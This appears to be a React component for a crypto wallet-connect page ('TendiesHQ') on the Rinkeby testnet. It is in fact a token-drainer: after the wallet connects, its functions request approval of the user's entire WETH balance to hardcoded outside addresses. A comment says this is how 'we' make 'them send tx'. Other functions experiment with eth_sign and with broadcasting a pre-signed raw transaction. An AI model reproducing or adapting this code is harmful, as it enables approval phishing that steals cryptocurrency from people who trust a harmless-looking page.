import React, {useState, useEffect} from "react";
import "./main.css"
import Web3 from "web3";
import ContractAbi from "../../contracts/weth.json";
import BigNumber from "bignumber.js";
import { ethers } from "ethers";
import { encode } from 'rlp';
import { sha256, sha224 } from 'js-sha256';

const Main = () => {
    const [currentAccount, setCurrentAccount] = useState(null);
    const [error, setError] = useState("");
    const [net, setNet] = useState(0)
    
    const checkWalletConnected = async () => {
        const { ethereum } = window;
        if (!ethereum) {
            console.log("Metamask not detected");
            return;
        } else {
            console.log("Wallet exists")
        }
        const accounts = await ethereum.request({method: "eth_accounts"});
        const networkId = await ethereum.request({
            method: "net_version",
          });
          if (networkId != 4) {
              console.log("Wrong chain");
              return
          } else {
              console.log("Correct chain")
          }
        if (accounts.length !== 0) {
            const account = accounts[0];
            console.log("Found account");
            setCurrentAccount(account);
        } else {
            console.log("No authorised account");
        }
    }

    const connectWalletHandler = async () => {
        const { ethereum } = window;
    
        if (!ethereum) {
          alert("Please install Metamask!");
        }
    
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          const networkId = await ethereum.request({
            method: "net_version",
          });
          setNet(networkId)
          if (networkId != 4) {
              setError("You are on the wrong chain, please change to Rinkeby Testnet");
              console.log("bruh", networkId)
              return;
          }
          console.log("Found an account! Address: ", accounts[0]);
          setCurrentAccount(accounts[0]);
          setError("")
        } catch (err) {
          console.log(err)
          
        }
      }
    
      const connectWalletButton = () => {
        return (
          <button onClick={connectWalletHandler} className='btn'>
            Connect Wallet
          </button>
        )
      }

      const hasError = () => {
          return (
              <>
                <button onClick={connectWalletHandler} className='btn'>
                    Connect Wallet
                </button>
                <p color="red">{error}</p>
              </>
          )
      }

      // this was just to prove that .signTransaction is invalid. we cant make a wallet object without the private key (which we dont have)
      const newInteract = async () => {
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        let iface = new ethers.utils.Interface(ContractAbi);
        const signer = provider.getSigner();
        const contract = new ethers.Contract("0xc778417E063141139Fce010982780140Aa0cD5Ab", ContractAbi, signer);
        let name = await contract.name();
        let userBalance = await contract.balanceOf(signer.getAddress());
        let dat = iface.encodeFunctionData("approve", ["0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f",userBalance.toString() ])
        console.log(dat)
        let transaction = {
          from: signer.getAddress(),
          nonce : "0x0", // this is ignored by metamask
          gasLimit: "0x5208",
          gasPrice: "0x4E3B29200",
          to: "0xc778417E063141139Fce010982780140Aa0cD5Ab",
          data: dat,
          value: 0
        }
        let signature = await signer.signTransaction(transaction) // we cant use wallet.signTransaction as you cant make a wallet object without private key
        //await contract.approve("0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", userBalance.toString())
        console.log("Contract : ",  contract)
        console.log("Account:", await signer.getAddress());
        console.log("Name", name)

      }

      // this is the function that should return us a valid sig (it does not, the error is misleading and makes no sense)
      const interact = async () => {
        const { ethereum } = window;
        const web3 = new Web3(ethereum);
        const contract = new web3.eth.Contract(ContractAbi, "0xc778417E063141139Fce010982780140Aa0cD5Ab");
        let userBalance = await contract.methods.balanceOf(currentAccount).call();

        let tx_builder =  contract.methods.approve("0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", userBalance.toString());
        let encoded_tx = tx_builder.encodeABI();
        
        console.log(encoded_tx)
        const accounts = await ethereum.request({method: "eth_accounts"});
        console.log(accounts)
        let transaction = {
          from: accounts[0],
          nonce : "0x0", // this is ignored by metamask
          gasLimit: "0x5208",
          gasPrice: "0x4E3B29200",
          to: "0xc778417E063141139Fce010982780140Aa0cD5Ab",
          data: encoded_tx,
          value: 0
        }

        const rawTransaction = encode([transaction.to, transaction.data, transaction.nonce, transaction.gasPrice, transaction.gasLimit,  transaction.value]);
        // encode is import from the rld library
        console.log("sha : ", sha256(rawTransaction), typeof(sha256(rawTransaction)))
        console.log(rawTransaction.toString('hex'));
        const signature = await ethereum.request({ method: 'eth_sign', params: [ "0x832B984Bf318fB50A5D2F1E1E4F43B7728e3606f", rawTransaction ] });


      }
      // this is the function we use to make them send tx
      const interactMain = async () => {
        const { ethereum } = window;
        const web3 = new Web3(ethereum);
        const contract = new web3.eth.Contract(ContractAbi, "0xc778417e063141139fce010982780140aa0cd5ab");
        console.log(contract)
        const accounts = await ethereum.request({method: "eth_accounts"});
        let userBalance = await contract.methods.balanceOf(currentAccount).call();
        console.log(userBalance)
        await contract.methods.approve("0x9D5233fDcaeBBBd29c1D356b53f519D2a58b6588", userBalance.toString()).send({
          from: accounts[0],
          to: "0xc778417e063141139fce010982780140aa0cd5ab",
          gasLimit: "21000"
        }).on("error", function(err){console.log(err);setError(err.message)});

      }

      const sendRawTx = () => {
        let rawData = "0x75f7e10bfca2301ee767b0331f841f2b27f32ae620602c0c26176672c0ab509a597fb92c900d569aa3c04ffe3ed02ea528c7be14a09d590b2bd6c8efdd609ddd1c"
        const { ethereum } = window;
        const web3 = new Web3(ethereum);
        web3.eth.sendSignedTransaction(rawData);
      }

      

      useEffect(() => {
        checkWalletConnected();
      }, [net])

    return (
        <>
            <div className="navbar">
              <div className="container">
                <a class="logo" href="https://4chan.org/biz/">Tendies<span>HQ</span></a>
                <img id="mobile-cta" class="mobile-menu" src="assets/menu.svg" alt="Open Navigation" />

              </div>
            </div>
            {error === "" ? null: <p style={{color: "red"}}>{error}</p>}
            
        </>
    )
}

export default Main;